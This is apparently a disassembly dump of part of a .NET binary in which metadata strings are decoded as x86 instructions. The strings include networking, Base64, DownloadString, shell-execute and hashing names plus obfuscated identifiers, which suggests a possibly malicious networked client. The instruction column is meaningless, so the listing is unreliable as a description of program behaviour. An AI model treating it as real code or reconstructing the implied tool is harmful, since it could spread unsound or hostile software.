  408447:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40844b:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408452:	6d                   	insl   (%dx),%es:(%edi)
  408453:	65 54                	gs push %esp
  408455:	79 70                	jns    0x4084c7
  408457:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40845b:	74 5f                	je     0x4084bc
  40845d:	56                   	push   %esi
  40845e:	61                   	popa
  40845f:	6c                   	insb   (%dx),%es:(%edi)
  408460:	75 65                	jne    0x4084c7
  408462:	54                   	push   %esp
  408463:	79 70                	jns    0x4084d5
  408465:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408469:	6f                   	outsl  %ds:(%esi),(%dx)
  40846a:	74 6f                	je     0x4084db
  40846c:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40846f:	54                   	push   %esp
  408470:	79 70                	jns    0x4084e2
  408472:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408476:	74 54                	je     0x4084cc
  408478:	79 70                	jns    0x4084ea
  40847a:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40847e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408481:	74 54                	je     0x4084d7
  408483:	79 70                	jns    0x4084f5
  408485:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408489:	6c                   	insb   (%dx),%es:(%edi)
  40848a:	65 53                	gs push %ebx
  40848c:	68 61 72 65 00       	push   $0x657261
  408491:	53                   	push   %ebx
  408492:	79 73                	jns    0x408507
  408494:	74 65                	je     0x4084fb
  408496:	6d                   	insl   (%dx),%es:(%edi)
  408497:	2e 43                	cs inc %ebx
  408499:	6f                   	outsl  %ds:(%esi),(%dx)
  40849a:	72 65                	jb     0x408501
  40849c:	00 43 6c             	add    %al,0x6c(%ebx)
  40849f:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a0:	73 65                	jae    0x408507
  4084a2:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4084a6:	70 6f                	jo     0x408517
  4084a8:	73 65                	jae    0x40850f
  4084aa:	00 50 61             	add    %dl,0x61(%eax)
  4084ad:	72 73                	jb     0x408522
  4084af:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4084b3:	72 52                	jb     0x408507
  4084b5:	65 76 65             	gs jbe 0x40851d
  4084b8:	72 73                	jb     0x40852d
  4084ba:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4084be:	30 39                	xor    %bh,(%ecx)
  4084c0:	43                   	inc    %ebx
  4084c1:	65 72 74             	gs jb  0x408538
  4084c4:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4084cb:	00 43 72             	add    %al,0x72(%ebx)
  4084ce:	65 61                	gs popa
  4084d0:	74 65                	je     0x408537
  4084d2:	00 53 65             	add    %dl,0x65(%ebx)
  4084d5:	74 54                	je     0x40852b
  4084d7:	68 72 65 61 64       	push   $0x64616572
  4084dc:	45                   	inc    %ebp
  4084dd:	78 65                	js     0x408544
  4084df:	63 75 74             	arpl   %esi,0x74(%ebp)
  4084e2:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4084e9:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4084ee:	65 74 65             	gs je  0x408556
  4084f1:	00 43 61             	add    %al,0x61(%ebx)
  4084f4:	6c                   	insb   (%dx),%es:(%edi)
  4084f5:	6c                   	insb   (%dx),%es:(%edi)
  4084f6:	53                   	push   %ebx
  4084f7:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  4084fe:	74 
  4084ff:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408503:	6d                   	insl   (%dx),%es:(%edi)
  408504:	70 69                	jo     0x40856f
  408506:	6c                   	insb   (%dx),%es:(%edi)
  408507:	65 72 47             	gs jb  0x408551
  40850a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40850c:	65 72 61             	gs jb  0x408570
  40850f:	74 65                	je     0x408576
  408511:	64 41                	fs inc %ecx
  408513:	74 74                	je     0x408589
  408515:	72 69                	jb     0x408580
  408517:	62 75 74             	bound  %esi,0x74(%ebp)
  40851a:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40851f:	75 67                	jne    0x408588
  408521:	67 61                	addr16 popa
  408523:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408527:	74 74                	je     0x40859d
  408529:	72 69                	jb     0x408594
  40852b:	62 75 74             	bound  %esi,0x74(%ebp)
  40852e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408532:	6d                   	insl   (%dx),%es:(%edi)
  408533:	56                   	push   %esi
  408534:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40853b:	74 74                	je     0x4085b1
  40853d:	72 69                	jb     0x4085a8
  40853f:	62 75 74             	bound  %esi,0x74(%ebp)
  408542:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408546:	73 65                	jae    0x4085ad
  408548:	6d                   	insl   (%dx),%es:(%edi)
  408549:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40854d:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408554:	72 
  408555:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40855c:	73 73                	jae    0x4085d1
  40855e:	65 6d                	gs insl (%dx),%es:(%edi)
  408560:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408564:	72 61                	jb     0x4085c7
  408566:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408569:	61                   	popa
  40856a:	72 6b                	jb     0x4085d7
  40856c:	41                   	inc    %ecx
  40856d:	74 74                	je     0x4085e3
  40856f:	72 69                	jb     0x4085da
  408571:	62 75 74             	bound  %esi,0x74(%ebp)
  408574:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408579:	67 65 74 46          	addr16 gs je 0x4085c3
  40857d:	72 61                	jb     0x4085e0
  40857f:	6d                   	insl   (%dx),%es:(%edi)
  408580:	65 77 6f             	gs ja  0x4085f2
  408583:	72 6b                	jb     0x4085f0
  408585:	41                   	inc    %ecx
  408586:	74 74                	je     0x4085fc
  408588:	72 69                	jb     0x4085f3
  40858a:	62 75 74             	bound  %esi,0x74(%ebp)
  40858d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408591:	73 65                	jae    0x4085f8
  408593:	6d                   	insl   (%dx),%es:(%edi)
  408594:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408598:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40859f:	69 
  4085a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4085a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4085a2:	41                   	inc    %ecx
  4085a3:	74 74                	je     0x408619
  4085a5:	72 69                	jb     0x408610
  4085a7:	62 75 74             	bound  %esi,0x74(%ebp)
  4085aa:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085ae:	73 65                	jae    0x408615
  4085b0:	6d                   	insl   (%dx),%es:(%edi)
  4085b1:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4085b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085b7:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4085bd:	74 69                	je     0x408628
  4085bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4085c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c1:	41                   	inc    %ecx
  4085c2:	74 74                	je     0x408638
  4085c4:	72 69                	jb     0x40862f
  4085c6:	62 75 74             	bound  %esi,0x74(%ebp)
  4085c9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085cd:	73 65                	jae    0x408634
  4085cf:	6d                   	insl   (%dx),%es:(%edi)
  4085d0:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4085d4:	65 73 63             	gs jae 0x40863a
  4085d7:	72 69                	jb     0x408642
  4085d9:	70 74                	jo     0x40864f
  4085db:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4085e2:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4085e9:	65 66 61             	gs popaw
  4085ec:	75 6c                	jne    0x40865a
  4085ee:	74 4d                	je     0x40863d
  4085f0:	65 6d                	gs insl (%dx),%es:(%edi)
  4085f2:	62 65 72             	bound  %esp,0x72(%ebp)
  4085f5:	41                   	inc    %ecx
  4085f6:	74 74                	je     0x40866c
  4085f8:	72 69                	jb     0x408663
  4085fa:	62 75 74             	bound  %esi,0x74(%ebp)
  4085fd:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408601:	6d                   	insl   (%dx),%es:(%edi)
  408602:	70 69                	jo     0x40866d
  408604:	6c                   	insb   (%dx),%es:(%edi)
  408605:	61                   	popa
  408606:	74 69                	je     0x408671
  408608:	6f                   	outsl  %ds:(%esi),(%dx)
  408609:	6e                   	outsb  %ds:(%esi),(%dx)
  40860a:	52                   	push   %edx
  40860b:	65 6c                	gs insb (%dx),%es:(%edi)
  40860d:	61                   	popa
  40860e:	78 61                	js     0x408671
  408610:	74 69                	je     0x40867b
  408612:	6f                   	outsl  %ds:(%esi),(%dx)
  408613:	6e                   	outsb  %ds:(%esi),(%dx)
  408614:	73 41                	jae    0x408657
  408616:	74 74                	je     0x40868c
  408618:	72 69                	jb     0x408683
  40861a:	62 75 74             	bound  %esi,0x74(%ebp)
  40861d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408621:	73 65                	jae    0x408688
  408623:	6d                   	insl   (%dx),%es:(%edi)
  408624:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408628:	72 6f                	jb     0x408699
  40862a:	64 75 63             	fs jne 0x408690
  40862d:	74 41                	je     0x408670
  40862f:	74 74                	je     0x4086a5
  408631:	72 69                	jb     0x40869c
  408633:	62 75 74             	bound  %esi,0x74(%ebp)
  408636:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40863a:	73 65                	jae    0x4086a1
  40863c:	6d                   	insl   (%dx),%es:(%edi)
  40863d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408641:	6f                   	outsl  %ds:(%esi),(%dx)
  408642:	70 79                	jo     0x4086bd
  408644:	72 69                	jb     0x4086af
  408646:	67 68 74 41 74 74    	addr16 push $0x74744174
  40864c:	72 69                	jb     0x4086b7
  40864e:	62 75 74             	bound  %esi,0x74(%ebp)
  408651:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408655:	73 65                	jae    0x4086bc
  408657:	6d                   	insl   (%dx),%es:(%edi)
  408658:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40865c:	6f                   	outsl  %ds:(%esi),(%dx)
  40865d:	6d                   	insl   (%dx),%es:(%edi)
  40865e:	70 61                	jo     0x4086c1
  408660:	6e                   	outsb  %ds:(%esi),(%dx)
  408661:	79 41                	jns    0x4086a4
  408663:	74 74                	je     0x4086d9
  408665:	72 69                	jb     0x4086d0
  408667:	62 75 74             	bound  %esi,0x74(%ebp)
  40866a:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40866e:	6e                   	outsb  %ds:(%esi),(%dx)
  40866f:	74 69                	je     0x4086da
  408671:	6d                   	insl   (%dx),%es:(%edi)
  408672:	65 43                	gs inc %ebx
  408674:	6f                   	outsl  %ds:(%esi),(%dx)
  408675:	6d                   	insl   (%dx),%es:(%edi)
  408676:	70 61                	jo     0x4086d9
  408678:	74 69                	je     0x4086e3
  40867a:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40867d:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408684:	69 
  408685:	62 75 74             	bound  %esi,0x74(%ebp)
  408688:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40868c:	74 5f                	je     0x4086ed
  40868e:	55                   	push   %ebp
  40868f:	73 65                	jae    0x4086f6
  408691:	53                   	push   %ebx
  408692:	68 65 6c 6c 45       	push   $0x456c6c65
  408697:	78 65                	js     0x4086fe
  408699:	63 75 74             	arpl   %esi,0x74(%ebp)
  40869c:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4086a0:	61                   	popa
  4086a1:	64 42                	fs inc %edx
  4086a3:	79 74                	jns    0x408719
  4086a5:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4086a9:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4086b0:	00 
  4086b1:	44                   	inc    %esp
  4086b2:	65 6c                	gs insb (%dx),%es:(%edi)
  4086b4:	65 74 65             	gs je  0x40871c
  4086b7:	56                   	push   %esi
  4086b8:	61                   	popa
  4086b9:	6c                   	insb   (%dx),%es:(%edi)
  4086ba:	75 65                	jne    0x408721
  4086bc:	00 47 65             	add    %al,0x65(%edi)
  4086bf:	74 56                	je     0x408717
  4086c1:	61                   	popa
  4086c2:	6c                   	insb   (%dx),%es:(%edi)
  4086c3:	75 65                	jne    0x40872a
  4086c5:	00 53 65             	add    %dl,0x65(%ebx)
  4086c8:	74 56                	je     0x408720
  4086ca:	61                   	popa
  4086cb:	6c                   	insb   (%dx),%es:(%edi)
  4086cc:	75 65                	jne    0x408733
  4086ce:	00 67 65             	add    %ah,0x65(%edi)
  4086d1:	74 5f                	je     0x408732
  4086d3:	4b                   	dec    %ebx
  4086d4:	65 65 70 41          	gs gs jo 0x408719
  4086d8:	6c                   	insb   (%dx),%es:(%edi)
  4086d9:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4086e0:	5f                   	pop    %edi
  4086e1:	4b                   	dec    %ebx
  4086e2:	65 65 70 41          	gs gs jo 0x408727
  4086e6:	6c                   	insb   (%dx),%es:(%edi)
  4086e7:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  4086ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ef:	76 65                	jbe    0x408756
  4086f1:	00 64 45 6f          	add    %ah,0x6f(%ebp,%eax,2)
  4086f5:	76 50                	jbe    0x408747
  4086f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f8:	53                   	push   %ebx
  4086f9:	67 51                	addr16 push %ecx
  4086fb:	77 65                	ja     0x408762
  4086fd:	00 73 65             	add    %dh,0x65(%ebx)
  408700:	74 5f                	je     0x408761
  408702:	42                   	inc    %edx
  408703:	6c                   	insb   (%dx),%es:(%edi)
  408704:	6f                   	outsl  %ds:(%esi),(%dx)
  408705:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408708:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40870f:	5f                   	pop    %edi
  408710:	54                   	push   %esp
  408711:	6f                   	outsl  %ds:(%esi),(%dx)
  408712:	74 61                	je     0x408775
  408714:	6c                   	insb   (%dx),%es:(%edi)
  408715:	53                   	push   %ebx
  408716:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40871d:	5f                   	pop    %edi
  40871e:	48                   	dec    %eax
  40871f:	65 61                	gs popa
  408721:	64 65 72 53          	fs gs jb 0x408778
  408725:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40872c:	5f                   	pop    %edi
  40872d:	48                   	dec    %eax
  40872e:	65 61                	gs popa
  408730:	64 65 72 53          	fs gs jb 0x408787
  408734:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40873b:	5f                   	pop    %edi
  40873c:	53                   	push   %ebx
  40873d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40873f:	64 42                	fs inc %edx
  408741:	75 66                	jne    0x4087a9
  408743:	66 65 72 53          	data16 gs jb 0x40879a
  408747:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40874e:	5f                   	pop    %edi
  40874f:	52                   	push   %edx
  408750:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408754:	76 65                	jbe    0x4087bb
  408756:	42                   	inc    %edx
  408757:	75 66                	jne    0x4087bf
  408759:	66 65 72 53          	data16 gs jb 0x4087b0
  40875d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408764:	5f                   	pop    %edi
  408765:	4b                   	dec    %ebx
  408766:	65 79 53             	gs jns 0x4087bc
  408769:	69 7a 65 00 42 68 6e 	imul   $0x6e684200,0x65(%edx),%edi
  408770:	4d                   	dec    %ebp
  408771:	42                   	inc    %edx
  408772:	77 59                	ja     0x4087cd
  408774:	59                   	pop    %ecx
  408775:	48                   	dec    %eax
  408776:	4a                   	dec    %edx
  408777:	66 00 75 6f          	data16 add %dh,0x6f(%ebp)
  40877b:	6e                   	outsb  %ds:(%esi),(%dx)
  40877c:	44                   	inc    %esp
  40877d:	61                   	popa
  40877e:	6b 41 6f 46          	imul   $0x46,0x6f(%ecx),%eax
  408782:	4a                   	dec    %edx
  408783:	42                   	inc    %edx
  408784:	4e                   	dec    %esi
  408785:	66 00 50 44          	data16 add %dl,0x44(%eax)
  408789:	43                   	inc    %ebx
  40878a:	6c                   	insb   (%dx),%es:(%edi)
  40878b:	48                   	dec    %eax
  40878c:	42                   	inc    %edx
  40878d:	66 6c                	data16 insb (%dx),%es:(%edi)
  40878f:	56                   	push   %esi
  408790:	61                   	popa
  408791:	58                   	pop    %eax
  408792:	4f                   	dec    %edi
  408793:	66 00 6d 56          	data16 add %ch,0x56(%ebp)
  408797:	61                   	popa
  408798:	6c                   	insb   (%dx),%es:(%edi)
  408799:	70 6b                	jo     0x408806
  40879b:	42                   	inc    %edx
  40879c:	64 41                	fs inc %ecx
  40879e:	65 66 00 65 44       	data16 add %ah,%gs:0x44(%ebp)
  4087a3:	57                   	push   %edi
  4087a4:	6c                   	insb   (%dx),%es:(%edi)
  4087a5:	75 4f                	jne    0x4087f6
  4087a7:	4c                   	dec    %esp
  4087a8:	44                   	inc    %esp
  4087a9:	73 4d                	jae    0x4087f8
  4087ab:	68 4c 6c 66 66       	push   $0x66666c4c
  4087b0:	00 64 4e 57          	add    %ah,0x57(%esi,%ecx,2)
  4087b4:	4f                   	dec    %edi
  4087b5:	58                   	pop    %eax
  4087b6:	70 46                	jo     0x4087fe
  4087b8:	74 6f                	je     0x408829
  4087ba:	53                   	push   %ebx
  4087bb:	4d                   	dec    %ebp
  4087bc:	45                   	inc    %ebp
  4087bd:	75 71                	jne    0x408830
  4087bf:	66 00 6d 75          	data16 add %ch,0x75(%ebp)
  4087c3:	79 52                	jns    0x408817
  4087c5:	44                   	inc    %esp
  4087c6:	52                   	push   %edx
  4087c7:	74 73                	je     0x40883c
  4087c9:	50                   	push   %eax
  4087ca:	49                   	dec    %ecx
  4087cb:	41                   	inc    %ecx
  4087cc:	41                   	inc    %ecx
  4087cd:	6d                   	insl   (%dx),%es:(%edi)
  4087ce:	74 66                	je     0x408836
  4087d0:	00 61 63             	add    %ah,0x63(%ecx)
  4087d3:	6b 47 4c 6c          	imul   $0x6c,0x4c(%edi),%eax
  4087d7:	76 4d                	jbe    0x408826
  4087d9:	43                   	inc    %ebx
  4087da:	74 74                	je     0x408850
  4087dc:	66 00 56 73          	data16 add %dl,0x73(%esi)
  4087e0:	53                   	push   %ebx
  4087e1:	7a 42                	jp     0x408825
  4087e3:	75 45                	jne    0x40882a
  4087e5:	42                   	inc    %edx
  4087e6:	69 6f 58 59 4a 78 48 	imul   $0x48784a59,0x58(%edi),%ebp
  4087ed:	67 00 7a 4f          	add    %bh,0x4f(%bp,%si)
  4087f1:	42                   	inc    %edx
  4087f2:	66 79 49             	data16 jns 0x40883e
  4087f5:	59                   	pop    %ecx
  4087f6:	55                   	push   %ebp
  4087f7:	57                   	push   %edi
  4087f8:	42                   	inc    %edx
  4087f9:	4f                   	dec    %edi
  4087fa:	67 00 4e 67          	add    %cl,0x67(%bp)
  4087fe:	74 56                	je     0x408856
  408800:	42                   	inc    %edx
  408801:	6d                   	insl   (%dx),%es:(%edi)
  408802:	77 64                	ja     0x408868
  408804:	6d                   	insl   (%dx),%es:(%edi)
  408805:	70 62                	jo     0x408869
  408807:	67 00 57 55          	add    %dl,0x55(%bx)
  40880b:	4c                   	dec    %esp
  40880c:	4c                   	dec    %esp
  40880d:	6c                   	insb   (%dx),%es:(%edi)
  40880e:	49                   	dec    %ecx
  40880f:	73 73                	jae    0x408884
  408811:	62 68 67             	bound  %ebp,0x67(%eax)
  408814:	00 43 72             	add    %al,0x72(%ebx)
  408817:	79 70                	jns    0x408889
  408819:	74 6f                	je     0x40888a
  40881b:	43                   	inc    %ebx
  40881c:	6f                   	outsl  %ds:(%esi),(%dx)
  40881d:	6e                   	outsb  %ds:(%esi),(%dx)
  40881e:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408824:	74 5f                	je     0x408885
  408826:	50                   	push   %eax
  408827:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40882e:	5f                   	pop    %edi
  40882f:	50                   	push   %eax
  408830:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408837:	74 65                	je     0x40889e
  408839:	6d                   	insl   (%dx),%es:(%edi)
  40883a:	2e 54                	cs push %esp
  40883c:	68 72 65 61 64       	push   $0x64616572
  408841:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408848:	5f                   	pop    %edi
  408849:	50                   	push   %eax
  40884a:	61                   	popa
  40884b:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408852:	64 64 
  408854:	5f                   	pop    %edi
  408855:	53                   	push   %ebx
  408856:	65 73 73             	gs jae 0x4088cc
  408859:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408860:	6e                   	outsb  %ds:(%esi),(%dx)
  408861:	67 00 55 54          	add    %dl,0x54(%di)
  408865:	46                   	inc    %esi
  408866:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408869:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40886c:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408873:	74 65                	je     0x4088da
  408875:	6d                   	insl   (%dx),%es:(%edi)
  408876:	2e 44                	cs inc %esp
  408878:	72 61                	jb     0x4088db
  40887a:	77 69                	ja     0x4088e5
  40887c:	6e                   	outsb  %ds:(%esi),(%dx)
  40887d:	67 2e 49             	addr16 cs dec %ecx
  408880:	6d                   	insl   (%dx),%es:(%edi)
  408881:	61                   	popa
  408882:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408889:	73 
  40888a:	74 65                	je     0x4088f1
  40888c:	6d                   	insl   (%dx),%es:(%edi)
  40888d:	2e 52                	cs push %edx
  40888f:	75 6e                	jne    0x4088ff
  408891:	74 69                	je     0x4088fc
  408893:	6d                   	insl   (%dx),%es:(%edi)
  408894:	65 2e 56             	gs cs push %esi
  408897:	65 72 73             	gs jb  0x40890d
  40889a:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4088a1:	46                   	inc    %esi
  4088a2:	72 6f                	jb     0x408913
  4088a4:	6d                   	insl   (%dx),%es:(%edi)
  4088a5:	42                   	inc    %edx
  4088a6:	61                   	popa
  4088a7:	73 65                	jae    0x40890e
  4088a9:	36 34 53             	ss xor $0x53,%al
  4088ac:	74 72                	je     0x408920
  4088ae:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4088b5:	61                   	popa
  4088b6:	73 65                	jae    0x40891d
  4088b8:	36 34 53             	ss xor $0x53,%al
  4088bb:	74 72                	je     0x40892f
  4088bd:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  4088c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c5:	6c                   	insb   (%dx),%es:(%edi)
  4088c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c7:	61                   	popa
  4088c8:	64 53                	fs push %ebx
  4088ca:	74 72                	je     0x40893e
  4088cc:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  4088d3:	74 72                	je     0x408947
  4088d5:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4088dc:	5f                   	pop    %edi
  4088dd:	41                   	inc    %ecx
  4088de:	73 53                	jae    0x408933
  4088e0:	74 72                	je     0x408954
  4088e2:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4088e9:	5f                   	pop    %edi
  4088ea:	41                   	inc    %ecx
  4088eb:	73 53                	jae    0x408940
  4088ed:	74 72                	je     0x408961
  4088ef:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4088f6:	53                   	push   %ebx
  4088f7:	74 72                	je     0x40896b
  4088f9:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408900:	73 74                	jae    0x408976
  408902:	72 69                	jb     0x40896d
  408904:	6e                   	outsb  %ds:(%esi),(%dx)
  408905:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408909:	73 74                	jae    0x40897f
  40890b:	65 6d                	gs insl (%dx),%es:(%edi)
  40890d:	2e 44                	cs inc %esp
  40890f:	72 61                	jb     0x408972
  408911:	77 69                	ja     0x40897c
  408913:	6e                   	outsb  %ds:(%esi),(%dx)
  408914:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408918:	74 5f                	je     0x408979
  40891a:	45                   	inc    %ebp
  40891b:	72 72                	jb     0x40898f
  40891d:	6f                   	outsl  %ds:(%esi),(%dx)
  40891e:	72 44                	jb     0x408964
  408920:	69 61 6c 6f 67 00 4c 	imul   $0x4c00676f,0x6c(%ecx),%esp
  408927:	73 51                	jae    0x40897a
  408929:	4f                   	dec    %edi
  40892a:	6a 64                	push   $0x64
  40892c:	48                   	dec    %eax
  40892d:	6c                   	insb   (%dx),%es:(%edi)
  40892e:	57                   	push   %edi
  40892f:	76 67                	jbe    0x408998
  408931:	00 59 4e             	add    %bl,0x4e(%ecx)
  408934:	58                   	pop    %eax
  408935:	68 4d 6b 75 7a       	push   $0x7a756b4d
  40893a:	65 67 5a             	gs addr16 pop %edx
  40893d:	66 4e                	dec    %si
  40893f:	65 68 00 41 7a 7a    	gs push $0x7a7a4100
  408945:	66 61                	popaw
  408947:	4d                   	dec    %ebp
  408948:	4e                   	dec    %esi
  408949:	58                   	pop    %eax
  40894a:	76 44                	jbe    0x408990
  40894c:	67 68 00 56 66 6e    	addr16 push $0x6e665600
  408952:	47                   	inc    %edi
  408953:	4c                   	dec    %esp
  408954:	63 6b 42             	arpl   %ebp,0x42(%ebx)
  408957:	78 4b                	js     0x4089a4
  408959:	53                   	push   %ebx
  40895a:	63 6c 68 00          	arpl   %ebp,0x0(%eax,%ebp,2)
  40895e:	78 78                	js     0x4089d8
  408960:	79 48                	jns    0x4089aa
  408962:	6a 69                	push   $0x69
  408964:	58                   	pop    %eax
  408965:	4e                   	dec    %esi
  408966:	72 65                	jb     0x4089cd
  408968:	6e                   	outsb  %ds:(%esi),(%dx)
  408969:	68 00 43 6f 6d       	push   $0x6d6f4300
  40896e:	70 75                	jo     0x4089e5
  408970:	74 65                	je     0x4089d7
  408972:	48                   	dec    %eax
  408973:	61                   	popa
  408974:	73 68                	jae    0x4089de
  408976:	00 56 65             	add    %dl,0x65(%esi)
  408979:	72 69                	jb     0x4089e4
  40897b:	66 79 48             	data16 jns 0x4089c6
  40897e:	61                   	popa
  40897f:	73 68                	jae    0x4089e9
  408981:	00 46 6c             	add    %al,0x6c(%esi)
  408984:	75 73                	jne    0x4089f9
  408986:	68 00 67 65 74       	push   $0x74656700
  40898b:	5f                   	pop    %edi
  40898c:	45                   	inc    %ebp
  40898d:	78 65                	js     0x4089f4
  40898f:	63 75 74             	arpl   %esi,0x74(%ebp)
  408992:	61                   	popa
  408993:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408997:	61                   	popa
  408998:	74 68                	je     0x408a02
  40899a:	00 47 65             	add    %al,0x65(%edi)
  40899d:	74 54                	je     0x4089f3
  40899f:	65 6d                	gs insl (%dx),%es:(%edi)
  4089a1:	70 50                	jo     0x4089f3
  4089a3:	61                   	popa
  4089a4:	74 68                	je     0x408a0e
  4089a6:	00 67 65             	add    %ah,0x65(%edi)
  4089a9:	74 5f                	je     0x408a0a
  4089ab:	4c                   	dec    %esp
  4089ac:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089ae:	67 74 68             	addr16 je 0x408a19
  4089b1:	00 69 62             	add    %ch,0x62(%ecx)
  4089b4:	4b                   	dec    %ebx
  4089b5:	50                   	push   %eax
  4089b6:	52                   	push   %edx
  4089b7:	79 65                	jns    0x408a1e
  4089b9:	72 54                	jb     0x408a0f
  4089bb:	46                   	inc    %esi
  4089bc:	69 00 71 67 41 6e    	imul   $0x6e416771,(%eax),%eax
  4089c2:	50                   	push   %eax
  4089c3:	4e                   	dec    %esi
  4089c4:	75 4c                	jne    0x408a12
  4089c6:	79 6c                	jns    0x408a34
  4089c8:	51                   	push   %ecx
  4089c9:	49                   	dec    %ecx
  4089ca:	69 00 50 4a 4b 41    	imul   $0x414b4a50,(%eax),%eax
  4089d0:	41                   	inc    %ecx
  4089d1:	71 63                	jno    0x408a36
  4089d3:	7a 55                	jp     0x408a2a
  4089d5:	52                   	push   %edx
